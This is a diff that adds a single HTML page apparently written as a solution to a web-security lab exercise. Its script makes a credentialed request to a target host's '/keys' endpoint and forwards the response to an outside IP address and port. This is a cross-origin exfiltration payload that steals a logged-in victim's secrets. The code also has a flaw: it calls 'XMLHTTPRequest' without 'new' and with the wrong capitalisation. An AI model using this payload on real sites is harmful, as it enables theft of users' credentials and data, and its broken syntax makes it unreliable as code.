@@ -1,0 +1,16 @@
+<html>
+	<body>
+		<script>
+			var xhr=XMLHTTPRequest();
+			xhr.open("POST", "http://ptl-fbafd824-4fabf863.libcurl.so/keys", false);
+			xhr.withCredentials=true;
+			xhr.send();
+			var a=xhr.responseText;
+			
+			var xhr2=XMLHTTPRequest();
+			xhr2.open("GET", "http://3.108.97.190:13601"+a, false);
+			xhr2.withCredentials=true;
+			xhr2.send();
+		</script>
+	</body>
+</html>
